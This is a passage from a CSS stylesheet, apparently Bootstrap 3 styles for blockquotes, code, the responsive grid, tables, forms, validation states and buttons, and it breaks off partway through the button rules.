.list-inline { padding-left: 0px; margin-left: -5px; list-style: none; }

.list-inline > li { display: inline-block; padding-right: 5px; padding-left: 5px; }

dl { margin-top: 0px; margin-bottom: 20px; }

dt, dd { line-height: 1.42857; }

dt { font-weight: 700; }

dd { margin-left: 0px; }

@media (min-width: 768px) {
  .dl-horizontal dt { float: left; width: 160px; overflow: hidden; clear: left; text-align: right; text-overflow: ellipsis; white-space: nowrap; }
  .dl-horizontal dd { margin-left: 180px; }
}

abbr[title], abbr[data-original-title] { cursor: help; border-bottom: 1px dotted rgb(119, 119, 119); }

.initialism { font-size: 90%; text-transform: uppercase; }

blockquote { padding: 10px 20px; margin: 0px 0px 20px; font-size: 17.5px; border-left: 5px solid rgb(238, 238, 238); }

blockquote p:last-child, blockquote ul:last-child, blockquote ol:last-child { margin-bottom: 0px; }

blockquote footer, blockquote small, blockquote .small { display: block; font-size: 80%; line-height: 1.42857; color: rgb(119, 119, 119); }

blockquote footer::before, blockquote small::before, blockquote .small::before { content: "— "; }

.blockquote-reverse, blockquote.pull-right { padding-right: 15px; padding-left: 0px; text-align: right; border-right: 5px solid rgb(238, 238, 238); border-left: 0px; }

.blockquote-reverse footer::before, blockquote.pull-right footer::before, .blockquote-reverse small::before, blockquote.pull-right small::before, .blockquote-reverse .small::before, blockquote.pull-right .small::before { content: ""; }

.blockquote-reverse footer::after, blockquote.pull-right footer::after, .blockquote-reverse small::after, blockquote.pull-right small::after, .blockquote-reverse .small::after, blockquote.pull-right .small::after { content: " —"; }

blockquote::before, blockquote::after { content: ""; }

address { margin-bottom: 20px; font-style: normal; line-height: 1.42857; }

code, kbd, pre, samp { font-family: Menlo, Monaco, Consolas, "Courier New", monospace; }

code { padding: 2px 4px; font-size: 90%; color: rgb(199, 37, 78); background-color: rgb(249, 242, 244); border-radius: 4px; }

kbd { padding: 2px 4px; font-size: 90%; color: rgb(255, 255, 255); background-color: rgb(51, 51, 51); border-radius: 3px; box-shadow: rgba(0, 0, 0, 0.25) 0px -1px 0px inset; }

kbd kbd { padding: 0px; font-size: 100%; box-shadow: none; }

pre { display: block; padding: 9.5px; margin: 0px 0px 10px; font-size: 13px; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; overflow-wrap: break-word; background-color: rgb(245, 245, 245); border: 1px solid rgb(204, 204, 204); border-radius: 4px; }

pre code { padding: 0px; font-size: inherit; color: inherit; white-space: pre-wrap; background-color: transparent; border-radius: 0px; }

.pre-scrollable { max-height: 340px; overflow-y: scroll; }

.container { padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; }

@media (min-width: 768px) {
  .container { width: 750px; }
}

@media (min-width: 992px) {
  .container { width: 970px; }
}

@media (min-width: 1200px) {
  .container { width: 1170px; }
}

.container-fluid { padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; }

.row { margin-right: -15px; margin-left: -15px; }

.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-right: 15px; padding-left: 15px; }

.col-xs-1, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9, .col-xs-10, .col-xs-11, .col-xs-12 { float: left; }

.col-xs-12 { width: 100%; }

.col-xs-11 { width: 91.6667%; }

.col-xs-10 { width: 83.3333%; }

.col-xs-9 { width: 75%; }

.col-xs-8 { width: 66.6667%; }

.col-xs-7 { width: 58.3333%; }

.col-xs-6 { width: 50%; }

.col-xs-5 { width: 41.6667%; }

.col-xs-4 { width: 33.3333%; }

.col-xs-3 { width: 25%; }

.col-xs-2 { width: 16.6667%; }

.col-xs-1 { width: 8.33333%; }

.col-xs-pull-12 { right: 100%; }

.col-xs-pull-11 { right: 91.6667%; }

.col-xs-pull-10 { right: 83.3333%; }

.col-xs-pull-9 { right: 75%; }

.col-xs-pull-8 { right: 66.6667%; }

.col-xs-pull-7 { right: 58.3333%; }

.col-xs-pull-6 { right: 50%; }

.col-xs-pull-5 { right: 41.6667%; }

.col-xs-pull-4 { right: 33.3333%; }

.col-xs-pull-3 { right: 25%; }

.col-xs-pull-2 { right: 16.6667%; }

.col-xs-pull-1 { right: 8.33333%; }

.col-xs-pull-0 { right: auto; }

.col-xs-push-12 { left: 100%; }

.col-xs-push-11 { left: 91.6667%; }

.col-xs-push-10 { left: 83.3333%; }

.col-xs-push-9 { left: 75%; }

.col-xs-push-8 { left: 66.6667%; }

.col-xs-push-7 { left: 58.3333%; }

.col-xs-push-6 { left: 50%; }

.col-xs-push-5 { left: 41.6667%; }

.col-xs-push-4 { left: 33.3333%; }

.col-xs-push-3 { left: 25%; }

.col-xs-push-2 { left: 16.6667%; }

.col-xs-push-1 { left: 8.33333%; }

.col-xs-push-0 { left: auto; }

.col-xs-offset-12 { margin-left: 100%; }

.col-xs-offset-11 { margin-left: 91.6667%; }

.col-xs-offset-10 { margin-left: 83.3333%; }

.col-xs-offset-9 { margin-left: 75%; }

.col-xs-offset-8 { margin-left: 66.6667%; }

.col-xs-offset-7 { margin-left: 58.3333%; }

.col-xs-offset-6 { margin-left: 50%; }

.col-xs-offset-5 { margin-left: 41.6667%; }

.col-xs-offset-4 { margin-left: 33.3333%; }

.col-xs-offset-3 { margin-left: 25%; }

.col-xs-offset-2 { margin-left: 16.6667%; }

.col-xs-offset-1 { margin-left: 8.33333%; }

.col-xs-offset-0 { margin-left: 0px; }

@media (min-width: 768px) {
  .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12 { float: left; }
  .col-sm-12 { width: 100%; }
  .col-sm-11 { width: 91.6667%; }
  .col-sm-10 { width: 83.3333%; }
  .col-sm-9 { width: 75%; }
  .col-sm-8 { width: 66.6667%; }
  .col-sm-7 { width: 58.3333%; }
  .col-sm-6 { width: 50%; }
  .col-sm-5 { width: 41.6667%; }
  .col-sm-4 { width: 33.3333%; }
  .col-sm-3 { width: 25%; }
  .col-sm-2 { width: 16.6667%; }
  .col-sm-1 { width: 8.33333%; }
  .col-sm-pull-12 { right: 100%; }
  .col-sm-pull-11 { right: 91.6667%; }
  .col-sm-pull-10 { right: 83.3333%; }
  .col-sm-pull-9 { right: 75%; }
  .col-sm-pull-8 { right: 66.6667%; }
  .col-sm-pull-7 { right: 58.3333%; }
  .col-sm-pull-6 { right: 50%; }
  .col-sm-pull-5 { right: 41.6667%; }
  .col-sm-pull-4 { right: 33.3333%; }
  .col-sm-pull-3 { right: 25%; }
  .col-sm-pull-2 { right: 16.6667%; }
  .col-sm-pull-1 { right: 8.33333%; }
  .col-sm-pull-0 { right: auto; }
  .col-sm-push-12 { left: 100%; }
  .col-sm-push-11 { left: 91.6667%; }
  .col-sm-push-10 { left: 83.3333%; }
  .col-sm-push-9 { left: 75%; }
  .col-sm-push-8 { left: 66.6667%; }
  .col-sm-push-7 { left: 58.3333%; }
  .col-sm-push-6 { left: 50%; }
  .col-sm-push-5 { left: 41.6667%; }
  .col-sm-push-4 { left: 33.3333%; }
  .col-sm-push-3 { left: 25%; }
  .col-sm-push-2 { left: 16.6667%; }
  .col-sm-push-1 { left: 8.33333%; }
  .col-sm-push-0 { left: auto; }
  .col-sm-offset-12 { margin-left: 100%; }
  .col-sm-offset-11 { margin-left: 91.6667%; }
  .col-sm-offset-10 { margin-left: 83.3333%; }
  .col-sm-offset-9 { margin-left: 75%; }
  .col-sm-offset-8 { margin-left: 66.6667%; }
  .col-sm-offset-7 { margin-left: 58.3333%; }
  .col-sm-offset-6 { margin-left: 50%; }
  .col-sm-offset-5 { margin-left: 41.6667%; }
  .col-sm-offset-4 { margin-left: 33.3333%; }
  .col-sm-offset-3 { margin-left: 25%; }
  .col-sm-offset-2 { margin-left: 16.6667%; }
  .col-sm-offset-1 { margin-left: 8.33333%; }
  .col-sm-offset-0 { margin-left: 0px; }
}

@media (min-width: 992px) {
  .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12 { float: left; }
  .col-md-12 { width: 100%; }
  .col-md-11 { width: 91.6667%; }
  .col-md-10 { width: 83.3333%; }
  .col-md-9 { width: 75%; }
  .col-md-8 { width: 66.6667%; }
  .col-md-7 { width: 58.3333%; }
  .col-md-6 { width: 50%; }
  .col-md-5 { width: 41.6667%; }
  .col-md-4 { width: 33.3333%; }
  .col-md-3 { width: 25%; }
  .col-md-2 { width: 16.6667%; }
  .col-md-1 { width: 8.33333%; }
  .col-md-pull-12 { right: 100%; }
  .col-md-pull-11 { right: 91.6667%; }
  .col-md-pull-10 { right: 83.3333%; }
  .col-md-pull-9 { right: 75%; }
  .col-md-pull-8 { right: 66.6667%; }
  .col-md-pull-7 { right: 58.3333%; }
  .col-md-pull-6 { right: 50%; }
  .col-md-pull-5 { right: 41.6667%; }
  .col-md-pull-4 { right: 33.3333%; }
  .col-md-pull-3 { right: 25%; }
  .col-md-pull-2 { right: 16.6667%; }
  .col-md-pull-1 { right: 8.33333%; }
  .col-md-pull-0 { right: auto; }
  .col-md-push-12 { left: 100%; }
  .col-md-push-11 { left: 91.6667%; }
  .col-md-push-10 { left: 83.3333%; }
  .col-md-push-9 { left: 75%; }
  .col-md-push-8 { left: 66.6667%; }
  .col-md-push-7 { left: 58.3333%; }
  .col-md-push-6 { left: 50%; }
  .col-md-push-5 { left: 41.6667%; }
  .col-md-push-4 { left: 33.3333%; }
  .col-md-push-3 { left: 25%; }
  .col-md-push-2 { left: 16.6667%; }
  .col-md-push-1 { left: 8.33333%; }
  .col-md-push-0 { left: auto; }
  .col-md-offset-12 { margin-left: 100%; }
  .col-md-offset-11 { margin-left: 91.6667%; }
  .col-md-offset-10 { margin-left: 83.3333%; }
  .col-md-offset-9 { margin-left: 75%; }
  .col-md-offset-8 { margin-left: 66.6667%; }
  .col-md-offset-7 { margin-left: 58.3333%; }
  .col-md-offset-6 { margin-left: 50%; }
  .col-md-offset-5 { margin-left: 41.6667%; }
  .col-md-offset-4 { margin-left: 33.3333%; }
  .col-md-offset-3 { margin-left: 25%; }
  .col-md-offset-2 { margin-left: 16.6667%; }
  .col-md-offset-1 { margin-left: 8.33333%; }
  .col-md-offset-0 { margin-left: 0px; }
}

@media (min-width: 1200px) {
  .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12 { float: left; }
  .col-lg-12 { width: 100%; }
  .col-lg-11 { width: 91.6667%; }
  .col-lg-10 { width: 83.3333%; }
  .col-lg-9 { width: 75%; }
  .col-lg-8 { width: 66.6667%; }
  .col-lg-7 { width: 58.3333%; }
  .col-lg-6 { width: 50%; }
  .col-lg-5 { width: 41.6667%; }
  .col-lg-4 { width: 33.3333%; }
  .col-lg-3 { width: 25%; }
  .col-lg-2 { width: 16.6667%; }
  .col-lg-1 { width: 8.33333%; }
  .col-lg-pull-12 { right: 100%; }
  .col-lg-pull-11 { right: 91.6667%; }
  .col-lg-pull-10 { right: 83.3333%; }
  .col-lg-pull-9 { right: 75%; }
  .col-lg-pull-8 { right: 66.6667%; }
  .col-lg-pull-7 { right: 58.3333%; }
  .col-lg-pull-6 { right: 50%; }
  .col-lg-pull-5 { right: 41.6667%; }
  .col-lg-pull-4 { right: 33.3333%; }
  .col-lg-pull-3 { right: 25%; }
  .col-lg-pull-2 { right: 16.6667%; }
  .col-lg-pull-1 { right: 8.33333%; }
  .col-lg-pull-0 { right: auto; }
  .col-lg-push-12 { left: 100%; }
  .col-lg-push-11 { left: 91.6667%; }
  .col-lg-push-10 { left: 83.3333%; }
  .col-lg-push-9 { left: 75%; }
  .col-lg-push-8 { left: 66.6667%; }
  .col-lg-push-7 { left: 58.3333%; }
  .col-lg-push-6 { left: 50%; }
  .col-lg-push-5 { left: 41.6667%; }
  .col-lg-push-4 { left: 33.3333%; }
  .col-lg-push-3 { left: 25%; }
  .col-lg-push-2 { left: 16.6667%; }
  .col-lg-push-1 { left: 8.33333%; }
  .col-lg-push-0 { left: auto; }
  .col-lg-offset-12 { margin-left: 100%; }
  .col-lg-offset-11 { margin-left: 91.6667%; }
  .col-lg-offset-10 { margin-left: 83.3333%; }
  .col-lg-offset-9 { margin-left: 75%; }
  .col-lg-offset-8 { margin-left: 66.6667%; }
  .col-lg-offset-7 { margin-left: 58.3333%; }
  .col-lg-offset-6 { margin-left: 50%; }
  .col-lg-offset-5 { margin-left: 41.6667%; }
  .col-lg-offset-4 { margin-left: 33.3333%; }
  .col-lg-offset-3 { margin-left: 25%; }
  .col-lg-offset-2 { margin-left: 16.6667%; }
  .col-lg-offset-1 { margin-left: 8.33333%; }
  .col-lg-offset-0 { margin-left: 0px; }
}

table { background-color: transparent; }

th { text-align: left; }

.table { width: 100%; max-width: 100%; margin-bottom: 20px; }

.table > thead > tr > th, .table > tbody > tr > th, .table > tfoot > tr > th, .table > thead > tr > td, .table > tbody > tr > td, .table > tfoot > tr > td { padding: 8px; line-height: 1.42857; vertical-align: top; border-top: 1px solid rgb(221, 221, 221); }

.table > thead > tr > th { vertical-align: bottom; border-bottom: 2px solid rgb(221, 221, 221); }

.table > caption + thead > tr:first-child > th, .table > colgroup + thead > tr:first-child > th, .table > thead:first-child > tr:first-child > th, .table > caption + thead > tr:first-child > td, .table > colgroup + thead > tr:first-child > td, .table > thead:first-child > tr:first-child > td { border-top: 0px; }

.table > tbody + tbody { border-top: 2px solid rgb(221, 221, 221); }

.table .table { background-color: rgb(255, 255, 255); }

.table-condensed > thead > tr > th, .table-condensed > tbody > tr > th, .table-condensed > tfoot > tr > th, .table-condensed > thead > tr > td, .table-condensed > tbody > tr > td, .table-condensed > tfoot > tr > td { padding: 5px; }

.table-bordered { border: 1px solid rgb(221, 221, 221); }

.table-bordered > thead > tr > th, .table-bordered > tbody > tr > th, .table-bordered > tfoot > tr > th, .table-bordered > thead > tr > td, .table-bordered > tbody > tr > td, .table-bordered > tfoot > tr > td { border: 1px solid rgb(221, 221, 221); }

.table-bordered > thead > tr > th, .table-bordered > thead > tr > td { border-bottom-width: 2px; }

.table-striped > tbody > tr:nth-child(2n+1) > td, .table-striped > tbody > tr:nth-child(2n+1) > th { background-color: rgb(249, 249, 249); }

.table-hover > tbody > tr:hover > td, .table-hover > tbody > tr:hover > th { background-color: rgb(245, 245, 245); }

table col[class*="col-"] { position: static; display: table-column; float: none; }

table td[class*="col-"], table th[class*="col-"] { position: static; display: table-cell; float: none; }

.table > thead > tr > td.active, .table > tbody > tr > td.active, .table > tfoot > tr > td.active, .table > thead > tr > th.active, .table > tbody > tr > th.active, .table > tfoot > tr > th.active, .table > thead > tr.active > td, .table > tbody > tr.active > td, .table > tfoot > tr.active > td, .table > thead > tr.active > th, .table > tbody > tr.active > th, .table > tfoot > tr.active > th { background-color: rgb(245, 245, 245); }

.table-hover > tbody > tr > td.active:hover, .table-hover > tbody > tr > th.active:hover, .table-hover > tbody > tr.active:hover > td, .table-hover > tbody > tr:hover > .active, .table-hover > tbody > tr.active:hover > th { background-color: rgb(232, 232, 232); }

.table > thead > tr > td.success, .table > tbody > tr > td.success, .table > tfoot > tr > td.success, .table > thead > tr > th.success, .table > tbody > tr > th.success, .table > tfoot > tr > th.success, .table > thead > tr.success > td, .table > tbody > tr.success > td, .table > tfoot > tr.success > td, .table > thead > tr.success > th, .table > tbody > tr.success > th, .table > tfoot > tr.success > th { background-color: rgb(223, 240, 216); }

.table-hover > tbody > tr > td.success:hover, .table-hover > tbody > tr > th.success:hover, .table-hover > tbody > tr.success:hover > td, .table-hover > tbody > tr:hover > .success, .table-hover > tbody > tr.success:hover > th { background-color: rgb(208, 233, 198); }

.table > thead > tr > td.info, .table > tbody > tr > td.info, .table > tfoot > tr > td.info, .table > thead > tr > th.info, .table > tbody > tr > th.info, .table > tfoot > tr > th.info, .table > thead > tr.info > td, .table > tbody > tr.info > td, .table > tfoot > tr.info > td, .table > thead > tr.info > th, .table > tbody > tr.info > th, .table > tfoot > tr.info > th { background-color: rgb(217, 237, 247); }

.table-hover > tbody > tr > td.info:hover, .table-hover > tbody > tr > th.info:hover, .table-hover > tbody > tr.info:hover > td, .table-hover > tbody > tr:hover > .info, .table-hover > tbody > tr.info:hover > th { background-color: rgb(196, 227, 243); }

.table > thead > tr > td.warning, .table > tbody > tr > td.warning, .table > tfoot > tr > td.warning, .table > thead > tr > th.warning, .table > tbody > tr > th.warning, .table > tfoot > tr > th.warning, .table > thead > tr.warning > td, .table > tbody > tr.warning > td, .table > tfoot > tr.warning > td, .table > thead > tr.warning > th, .table > tbody > tr.warning > th, .table > tfoot > tr.warning > th { background-color: rgb(252, 248, 227); }

.table-hover > tbody > tr > td.warning:hover, .table-hover > tbody > tr > th.warning:hover, .table-hover > tbody > tr.warning:hover > td, .table-hover > tbody > tr:hover > .warning, .table-hover > tbody > tr.warning:hover > th { background-color: rgb(250, 242, 204); }

.table > thead > tr > td.danger, .table > tbody > tr > td.danger, .table > tfoot > tr > td.danger, .table > thead > tr > th.danger, .table > tbody > tr > th.danger, .table > tfoot > tr > th.danger, .table > thead > tr.danger > td, .table > tbody > tr.danger > td, .table > tfoot > tr.danger > td, .table > thead > tr.danger > th, .table > tbody > tr.danger > th, .table > tfoot > tr.danger > th { background-color: rgb(242, 222, 222); }

.table-hover > tbody > tr > td.danger:hover, .table-hover > tbody > tr > th.danger:hover, .table-hover > tbody > tr.danger:hover > td, .table-hover > tbody > tr:hover > .danger, .table-hover > tbody > tr.danger:hover > th { background-color: rgb(235, 204, 204); }

@media screen and (max-width: 767px) {
  .table-responsive { width: 100%; margin-bottom: 15px; overflow: auto hidden; border: 1px solid rgb(221, 221, 221); }
  .table-responsive > .table { margin-bottom: 0px; }
  .table-responsive > .table > thead > tr > th, .table-responsive > .table > tbody > tr > th, .table-responsive > .table > tfoot > tr > th, .table-responsive > .table > thead > tr > td, .table-responsive > .table > tbody > tr > td, .table-responsive > .table > tfoot > tr > td { white-space: nowrap; }
  .table-responsive > .table-bordered { border: 0px; }
  .table-responsive > .table-bordered > thead > tr > th:first-child, .table-responsive > .table-bordered > tbody > tr > th:first-child, .table-responsive > .table-bordered > tfoot > tr > th:first-child, .table-responsive > .table-bordered > thead > tr > td:first-child, .table-responsive > .table-bordered > tbody > tr > td:first-child, .table-responsive > .table-bordered > tfoot > tr > td:first-child { border-left: 0px; }
  .table-responsive > .table-bordered > thead > tr > th:last-child, .table-responsive > .table-bordered > tbody > tr > th:last-child, .table-responsive > .table-bordered > tfoot > tr > th:last-child, .table-responsive > .table-bordered > thead > tr > td:last-child, .table-responsive > .table-bordered > tbody > tr > td:last-child, .table-responsive > .table-bordered > tfoot > tr > td:last-child { border-right: 0px; }
  .table-responsive > .table-bordered > tbody > tr:last-child > th, .table-responsive > .table-bordered > tfoot > tr:last-child > th, .table-responsive > .table-bordered > tbody > tr:last-child > td, .table-responsive > .table-bordered > tfoot > tr:last-child > td { border-bottom: 0px; }
}

fieldset { min-width: 0px; padding: 0px; margin: 0px; border: 0px; }

legend { display: block; width: 100%; padding: 0px; margin-bottom: 20px; font-size: 21px; line-height: inherit; color: rgb(51, 51, 51); border-width: 0px 0px 1px; border-top-style: initial; border-right-style: initial; border-left-style: initial; border-top-color: initial; border-right-color: initial; border-left-color: initial; border-image: initial; border-bottom-style: solid; border-bottom-color: rgb(229, 229, 229); }

label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: 700; }

input[type="search"] { box-sizing: border-box; }

input[type="radio"], input[type="checkbox"] { margin: 4px 0px 0px; line-height: normal; }

input[type="file"] { display: block; }

input[type="range"] { display: block; width: 100%; }

select[multiple], select[size] { height: auto; }

input[type="file"]:focus, input[type="radio"]:focus, input[type="checkbox"]:focus { outline: -webkit-focus-ring-color auto 5px; outline-offset: -2px; }

output { display: block; padding-top: 7px; font-size: 14px; line-height: 1.42857; color: rgb(85, 85, 85); }

.form-control { display: block; width: 100%; height: 34px; padding: 6px 12px; font-size: 14px; line-height: 1.42857; color: rgb(85, 85, 85); background-color: rgb(255, 255, 255); background-image: none; border: 1px solid rgb(204, 204, 204); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; }

.form-control:focus { border-color: rgb(102, 175, 233); outline: 0px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgba(102, 175, 233, 0.6) 0px 0px 8px; }

.form-control::-webkit-input-placeholder { color: rgb(119, 119, 119); }

.form-control[disabled], .form-control[readonly], fieldset[disabled] .form-control { cursor: not-allowed; background-color: rgb(238, 238, 238); opacity: 1; }

textarea.form-control { height: auto; }

input[type="search"] { appearance: none; }

input[type="date"], input[type="time"], input[type="datetime-local"], input[type="month"] { line-height: 34px; }

input.input-sm[type="date"], input.input-sm[type="time"], input.input-sm[type="datetime-local"], input.input-sm[type="month"] { line-height: 30px; }

input.input-lg[type="date"], input.input-lg[type="time"], input.input-lg[type="datetime-local"], input.input-lg[type="month"] { line-height: 46px; }

.form-group { margin-bottom: 15px; }

.radio, .checkbox { position: relative; display: block; min-height: 20px; margin-top: 10px; margin-bottom: 10px; }

.radio label, .checkbox label { padding-left: 20px; margin-bottom: 0px; font-weight: 400; cursor: pointer; }

.radio input[type="radio"], .radio-inline input[type="radio"], .checkbox input[type="checkbox"], .checkbox-inline input[type="checkbox"] { position: absolute; margin-left: -20px; }

.radio + .radio, .checkbox + .checkbox { margin-top: -5px; }

.radio-inline, .checkbox-inline { display: inline-block; padding-left: 20px; margin-bottom: 0px; font-weight: 400; vertical-align: middle; cursor: pointer; }

.radio-inline + .radio-inline, .checkbox-inline + .checkbox-inline { margin-top: 0px; margin-left: 10px; }

input[type="radio"][disabled], input[type="checkbox"][disabled], input.disabled[type="radio"], input.disabled[type="checkbox"], fieldset[disabled] input[type="radio"], fieldset[disabled] input[type="checkbox"] { cursor: not-allowed; }

.radio-inline.disabled, .checkbox-inline.disabled, fieldset[disabled] .radio-inline, fieldset[disabled] .checkbox-inline { cursor: not-allowed; }

.radio.disabled label, .checkbox.disabled label, fieldset[disabled] .radio label, fieldset[disabled] .checkbox label { cursor: not-allowed; }

.form-control-static { padding-top: 7px; padding-bottom: 7px; margin-bottom: 0px; }

.form-control-static.input-lg, .form-control-static.input-sm { padding-right: 0px; padding-left: 0px; }

.input-sm, .form-horizontal .form-group-sm .form-control { height: 30px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; }

select.input-sm { height: 30px; line-height: 30px; }

textarea.input-sm, select.input-sm[multiple] { height: auto; }

.input-lg, .form-horizontal .form-group-lg .form-control { height: 46px; padding: 10px 16px; font-size: 18px; line-height: 1.33; border-radius: 6px; }

select.input-lg { height: 46px; line-height: 46px; }

textarea.input-lg, select.input-lg[multiple] { height: auto; }

.has-feedback { position: relative; }

.has-feedback .form-control { padding-right: 42.5px; }

.form-control-feedback { position: absolute; top: 25px; right: 0px; z-index: 2; display: block; width: 34px; height: 34px; line-height: 34px; text-align: center; }

.input-lg + .form-control-feedback { width: 46px; height: 46px; line-height: 46px; }

.input-sm + .form-control-feedback { width: 30px; height: 30px; line-height: 30px; }

.has-success .help-block, .has-success .control-label, .has-success .radio, .has-success .checkbox, .has-success .radio-inline, .has-success .checkbox-inline { color: rgb(60, 118, 61); }

.has-success .form-control { border-color: rgb(60, 118, 61); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; }

.has-success .form-control:focus { border-color: rgb(43, 84, 44); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgb(103, 177, 104) 0px 0px 6px; }

.has-success .input-group-addon { color: rgb(60, 118, 61); background-color: rgb(223, 240, 216); border-color: rgb(60, 118, 61); }

.has-success .form-control-feedback { color: rgb(60, 118, 61); }

.has-warning .help-block, .has-warning .control-label, .has-warning .radio, .has-warning .checkbox, .has-warning .radio-inline, .has-warning .checkbox-inline { color: rgb(138, 109, 59); }

.has-warning .form-control { border-color: rgb(138, 109, 59); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; }

.has-warning .form-control:focus { border-color: rgb(102, 81, 44); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgb(192, 161, 107) 0px 0px 6px; }

.has-warning .input-group-addon { color: rgb(138, 109, 59); background-color: rgb(252, 248, 227); border-color: rgb(138, 109, 59); }

.has-warning .form-control-feedback { color: rgb(138, 109, 59); }

.has-error .help-block, .has-error .control-label, .has-error .radio, .has-error .checkbox, .has-error .radio-inline, .has-error .checkbox-inline { color: rgb(169, 68, 66); }

.has-error .form-control { border-color: rgb(169, 68, 66); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; }

.has-error .form-control:focus { border-color: rgb(132, 53, 52); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgb(206, 132, 131) 0px 0px 6px; }

.has-error .input-group-addon { color: rgb(169, 68, 66); background-color: rgb(242, 222, 222); border-color: rgb(169, 68, 66); }

.has-error .form-control-feedback { color: rgb(169, 68, 66); }

.has-feedback label.sr-only ~ .form-control-feedback { top: 0px; }

.help-block { display: block; margin-top: 5px; margin-bottom: 10px; color: rgb(115, 115, 115); }

@media (min-width: 768px) {
  .form-inline .form-group { display: inline-block; margin-bottom: 0px; vertical-align: middle; }
  .form-inline .form-control { display: inline-block; width: auto; vertical-align: middle; }
  .form-inline .input-group { display: inline-table; vertical-align: middle; }
  .form-inline .input-group .input-group-addon, .form-inline .input-group .input-group-btn, .form-inline .input-group .form-control { width: auto; }
  .form-inline .input-group > .form-control { width: 100%; }
  .form-inline .control-label { margin-bottom: 0px; vertical-align: middle; }
  .form-inline .radio, .form-inline .checkbox { display: inline-block; margin-top: 0px; margin-bottom: 0px; vertical-align: middle; }
  .form-inline .radio label, .form-inline .checkbox label { padding-left: 0px; }
  .form-inline .radio input[type="radio"], .form-inline .checkbox input[type="checkbox"] { position: relative; margin-left: 0px; }
  .form-inline .has-feedback .form-control-feedback { top: 0px; }
}

.form-horizontal .radio, .form-horizontal .checkbox, .form-horizontal .radio-inline, .form-horizontal .checkbox-inline { padding-top: 7px; margin-top: 0px; margin-bottom: 0px; }

.form-horizontal .radio, .form-horizontal .checkbox { min-height: 27px; }

.form-horizontal .form-group { margin-right: -15px; margin-left: -15px; }

@media (min-width: 768px) {
  .form-horizontal .control-label { padding-top: 7px; margin-bottom: 0px; text-align: right; }
}

.form-horizontal .has-feedback .form-control-feedback { top: 0px; right: 15px; }

@media (min-width: 768px) {
  .form-horizontal .form-group-lg .control-label { padding-top: 14.3px; }
}

@media (min-width: 768px) {
  .form-horizontal .form-group-sm .control-label { padding-top: 6px; }
}

.btn { display: inline-block; padding: 6px 12px; margin-bottom: 0px; font-size: 14px; font-weight: 400; line-height: 1.42857; text-align: center; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; background-image: none; border: 1px solid transparent; border-radius: 4px; }

.btn:focus, .btn:active:focus, .btn.active:focus { outline: -webkit-focus-ring-color auto 5px; outline-offset: -2px; }

.btn:hover, .btn:focus { color: rgb(51, 51, 51); text-decoration: none; }

.btn:active, .btn.active { background-image: none; outline: 0px; box-shadow: rgba(0, 0, 0, 0.125) 0px 3px 5px inset; }

.btn.disabled, .btn[disabled], fieldset[disabled] .btn { pointer-events: none; cursor: not-allowed; box-shadow: none; opacity: 0.65; }

.btn-default { color: rgb(51, 51, 51); background-color: rgb(255, 255, 255); border-color: rgb(204, 204, 204); }

.btn-default:hover, .btn-default:focus, .btn-default:active, .btn-default.active, .open > .dropdown-toggle.btn-default { color: rgb(51, 51, 51); background-color: rgb(230, 230, 230); border-color: rgb(173, 173, 173); }

.btn-default:active, .btn-default.active, .open > .dropdown-toggle.btn-default { background-image: none; }

.btn-default.disabled, .btn-default[disabled], fieldset[disabled] .btn-default, .btn-default.disabled:hover, .btn-default[disabled]:hover, fieldset[disabled] .btn-default:hover, .btn-default.disabled:focus, .btn-default[disabled]:focus, fieldset[disabled] .btn-default:focus, .btn-default.disabled:active, .btn-default[disabled]:active, fieldset[disabled] .btn-default:active, .btn-default.disabled.active, .btn-default.active[disabled], fieldset[disabled] .btn-default.active { background-color: rgb(255, 255, 255); border-color: rgb(204, 204, 204); }

.btn-default .badge { color: rgb(255, 255, 255); background-color: rgb(51, 51, 51); }

.btn-primary { color: rgb(255, 255, 255); background-color: rgb(66, 139, 202); border-color: rgb(53, 126, 189); }

.btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary.active, .open > .dropdown-toggle.btn-primary { color: rgb(255, 255, 255); background-color: rgb(48, 113, 169); border-color: rgb(40, 94, 142); }

.btn-primary:active, .btn-primary.active, .open > .dropdown-toggle.btn-primary { background-image: none; }

